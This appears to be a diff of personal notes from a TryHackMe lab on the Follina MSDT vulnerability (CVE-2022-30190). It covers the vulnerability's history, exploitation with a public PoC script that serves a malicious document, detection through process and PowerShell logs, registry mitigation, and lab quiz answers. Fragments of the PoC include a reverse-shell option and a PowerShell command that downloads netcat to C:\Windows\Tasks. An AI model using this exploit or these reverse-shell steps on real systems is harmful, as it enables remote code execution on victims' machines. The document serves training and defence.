@@ -6,8 +6,6 @@ A walkthrough on the CVE-2022-30190, the MSDT service, exploitation of the servi
 
 ### Introduction 
 
-
-
 Microsoft [explains](https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/) that “a remote code execution vulnerability exists when MSDT is called using the URL protocol from a calling application such as Word. An attacker who successfully exploits this vulnerability can run arbitrary code with the privileges of the calling application. The attacker can then install programs, view, change, or delete data, or create new accounts in the context allowed by the user’s rights”
 
 Learning Objectives:
@@ -25,7 +23,6 @@ Microsoft Support Diagnostic Tool which provides the troubleshooting wizard to d
 The MSDT exploit is not something new - in fact, a bachelor’s thesis has been published August of 2020 regarding techniques on how to use MSDT for code execution. Almost two years after that initial publication, pieces of evidence of MSDT exploitation as well as code execution via Office URIs has triggered several independent researchers to file separate reports to [MSRC](https://msrc-blog.microsoft.com/), the latter of which has been patched (specifically in Microsoft Teams) whereas the former remained vulnerable
 
 It’s not until the discovery of nao_sec, which has been made public in twitter, that attacks using this particular vector is actively being made in the wild. This is consequently picked up by Kevin Beaumont who publicly identified it as a zero day that Microsoft EDR products are failing to detect, and then later classified by Microsoft as a zero day with the vulnerability name CVE-2022-30190
-
 
 Summarized timeline of its discovery:
 
@@ -58,23 +55,16 @@ Further readings:
     Rapid Response: Microsoft Office RCE - “Follina” MSDT Attack (huntress.com)
     https://www.huntress.com/blog/microsoft-office-remote-code-execution-follina-msdt-bug
 
-
 What year was MSDT first discovered to be vulnerable to code execution?
 *2020*
 
-
-
 Who is the author of the bachelor's thesis which first detailed this vulnerability?
 *Benjamin Altpeter*
-
-
 
 What is the name of the APT hunting group who first reported evidence of exploitation in the wild of MSDT to MSRC? 
 *Shadowchasing1*
 
 ### The MSDT Service 
-
-
 
 [Microsoft](https://docs.microsoft.com/en-us/troubleshoot/sql/general/answers-questions-msdt) states that “the Microsoft Support Diagnostic Tool (MSDT) collects information to send to Microsoft Support. They will then analyze this information and use it to determine the resolution to any problems that you may be experiencing on your computer”
 
@@ -84,7 +74,6 @@ Think of it like this - you’re having car problems and you don’t know about 
 
 Further reading: Windows 10 CTP: How To Run Microsoft Support Diagnostic Tool - TechNet Articles - United States (English) - TechNet Wiki
 https://social.technet.microsoft.com/wiki/contents/articles/30458.windows-10-ctp-how-to-run-microsoft-support-diagnostic-tool.aspx
-
 
 What's one thing you need that the support will provide you when you're using the MSDT legitimately? 
 *passkey*
@@ -177,9 +166,7 @@ root@attackbox:~# cd ~/Rooms/Follina-MSDT
 root@attackbox:~/Rooms/Follina-MSDT# python -m http.server 3456
 Serving HTTP on 0.0.0.0 port 3456 (http://0.0.0.0:3456/) ...
 
-
 ```
-
 
 Start the Windows machine and wait for it to initialize. When everything's settled, proceed to open a command prompt and enter the following command: 
 
@@ -193,7 +180,6 @@ Microsoft Windows [Version]
 
 C:\Users\Administrator> cd Desktop
 C:\Users\Administrator\Desktop> curl http://[attackbox IP]:3456/follina.doc -o follina.docx
-
 
 ```
 
@@ -283,7 +269,6 @@ parser.add_argument(
     default="0",
     help="port to serve reverse shell on",
 )
-
 
 def main(args):
 
@@ -390,7 +375,6 @@ def main(args):
     else:
         serve_http()
 
-
 if __name__ == "__main__":
 
     main(parser.parse_args())
@@ -433,7 +417,6 @@ C:\Users\Administrator\Desktop>curl http://10.10.1.188:3456/follina.doc -o folli
                                  Dload  Upload   Total   Spent    Left  Speed
 100 10694  100 10694    0     0  10694      0  0:00:01 --:--:--  0:00:01  652k
 
-
 after clicking follina word
 
 root@ip-10-10-1-188:~/Rooms/Follina-MSDT# python3.9 follina.py 
@@ -458,10 +441,7 @@ root@ip-10-10-1-188:~/Rooms/Follina-MSDT# python3.9 follina.py
 10.10.198.117 - - [29/Oct/2022 00:31:04] "HEAD /index.html HTTP/1.1" 200 -
 10.10.198.117 - - [29/Oct/2022 00:32:32] "HEAD /index.html HTTP/1.1" 200 -
 
-
 ```
-
-![[Pasted image 20221028183144.png]]
 
 “Zero Click” Implementation
 
@@ -479,16 +459,12 @@ And the calculator got spawned even without opening the maldoc! 😱
 	What application got executed upon opening of the maldoc that signified compromise? Answer format is "<app>.exe"
 *win32calc.exe*
 
-
-
 What is the filename of the .docx file that has been discovered in the wild? Write it exactly as you see it.
 
 Fun fact: The last part of the filename is actually the area code of Follina, Italy which is where this vulnerability got it's name from.
 External Research Required
-![[Pasted image 20221028185635.png]]
 https://www.virustotal.com/gui/file/4a24048f81afbe9fb62e7a6a49adbd1faf41f266b5f9feecdceb567aec096784/details
 *05-2022-0438.doc*
-
 
 The PoC that we used has the capability to establish a reverse shell upon exploit - what binary is being used to accomplish this?
 Check the follina.py file
@@ -497,27 +473,19 @@ command = f"""Invoke-WebRequest https://github.com/JohnHammond/msdt-follina/blob
 ```
 *netcat* 
 
-
 	Where is this binary being downloaded?
 	*C:\\Windows\\Tasks*
 
-
 In the original exploit execution, two parent processes are of interest in the list of running processes in Process Explorer, one of them is WINWORD.EXE. Can you find the other one?
 Pay attention to own processes (purple highlight). Close everything and check process explorer again. Re-run the maldoc and check process explorer again.
-![[Pasted image 20221028190150.png]]
 
 *sdiagnhost.exe*
 
-
 What is the child process of WINWORD.EXE?
-![[Pasted image 20221028190226.png]]
 *msdt.exe*
 
-
 What is the child process of the other interesting parent process?
-![[Pasted image 20221028190351.png]]
 *conhost.exe*
-
 
 What process would be the most obvious piece of evidence to conclude that the "Zero Click" implementation of the exploit was used?
 Close everything and check process explorer again. Re-run the maldoc and check process explorer again. ;) hehe
@@ -564,13 +532,9 @@ Here we'll see that the WINWORD.EXE is the Creator Process, more commonly known 
 
 Since we saw PowerShell cmdlets, it would make sense for us to filter out PowerShell events to further check this lead. Since there's a lot of unique event IDs that log PowerShell events, we can filter via Provider. Go to Options > Advanced Options. Click the second dropdown menu and select Show only the specific providers (comma-delimited...). Type PowerShell enclosed with wildcards (*) so all providers with regards to PowerShell will be included.
 
-![[Pasted image 20221028192648.png]]
-
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/671f03a57359033de387b25a1d087300.png)
 
 Clear the "Quick Filter" box of the 4688 we entered earlier, and the screen should populate with events that exclusively come from PowerShell providers. From here, we can filter the events via part of the PowerShell command we've noted above.
-
-![[Pasted image 20221028193003.png]]
 
 ![](https://tryhackme-images.s3.amazonaws.com/user-uploads/60c1834f577d63004fdaec50/room-content/bb40ec87492639e3e808b7a38b5e586c.png)
 
@@ -602,22 +566,14 @@ Antivirus / Windows Defender
 A number of Microsoft Defender products have detection mechanisms in place and our trusty Microsoft Security Response Center provides us a list of those
 https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/
 
-![[Pasted image 20221028193355.png]]
-
-
 What encoding is used in the string Y2FsYw==
 *base64*
-
 
 What is the parent process of calc.exe?
 *sdiagnhost.exe*
 
-
-![[Pasted image 20221028194459.png]]
-
 Diagnostic package index information is loaded from what file path?
 https://answers.microsoft.com/en-us/windows/forum/all/cwindowsdiagnosticsindexdevicediagnosticxml/2a6039d8-90b5-48e7-9df0-556d6ecbeb4f
-![[Pasted image 20221028194830.png]]
 		
 		*C:\Windows\diagnostics\index*
 
@@ -660,7 +616,6 @@ The operation completed successfully.
 C:\Users\Administrator\Desktop> reg query HKEY_CLASSES_ROOT\ms-msdt
 ERROR: The system was unable to find the specified registry key or value.
 
-
 ```
 
 By now, you must have noticed that we're always changing our working directory to the Desktop - it's so we can immediately see the changes that our commands are introducing to the environment: file creation is fairly noticeable. It is by no means, however, the best practice to do in any environment.
@@ -677,8 +632,6 @@ If you’re using Microsoft Defender for Endpoint in your environment, enable th
 
 Further Reading: Guidance for CVE-2022-30190 Microsoft Support Diagnostic Tool Vulnerability – Microsoft Security Response Center
 https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/
-
-
 
 What error message did the document give upon opening?
 
@@ -710,12 +663,9 @@ C:\Users\Administrator\Desktop>reg query HKEY_CLASSES_ROOT\ms-msdt
 ERROR: The system was unable to find the specified registry key or value.
 ```
 
-![[Pasted image 20221028195855.png]]
-
 *You'll need a new app to open this ms-msdt*
 
 https://www.youtube.com/watch?v=dGCOhORNKRk
-
 
 ### Room Recap + Recent Developments 
 
@@ -730,8 +680,6 @@ As of room publishing, Microsoft has already released a patch that blocks PowerS
 
 This room will be updated from time to time.
 
-
 See you again soon, and happy hunting!
-
 
 [[Keldagrim]]
